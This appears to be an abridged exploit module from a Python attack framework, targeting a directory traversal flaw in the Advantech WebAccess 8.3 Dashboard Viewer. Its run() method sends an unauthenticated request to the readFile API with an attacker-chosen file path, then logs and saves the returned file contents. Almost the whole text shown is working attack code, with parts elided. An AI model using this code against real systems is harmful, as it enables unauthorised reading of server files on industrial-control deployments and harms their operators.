...
from core.WebHelper import SimpleWebServer

INFO = {}
INFO['NAME'] = "efs_advantech_webaccess_8_3_directory_traversal.py"
INFO['DESCRIPTION'] = "Advantech WebAccess(8.3) Dashboard Viewer Directory Traversal"
...
/api/dashboard/v1/files/readFile api function allows unauthenticated attackers to read arbitrary text file on the server.
...
class exploit(Sploit):
    ...
    def run(self):
        ...
        url = str(self.make_url('WADashboard/api/dashboard/v1/files/readFile?projectSpecies=&filepath=' + data))
        res = urllib2.urlopen(url).read()
        data = json.loads(res)
        if data['resStatus'] == "1":
            self.log('[-] ' + data['resString'])
            self.finish(False)
        if len(data['resString']) < 10000:
            self.log('[+]\r\n' + data['resString'])
        self.writefile(data['resString'])
        self.finish(True)
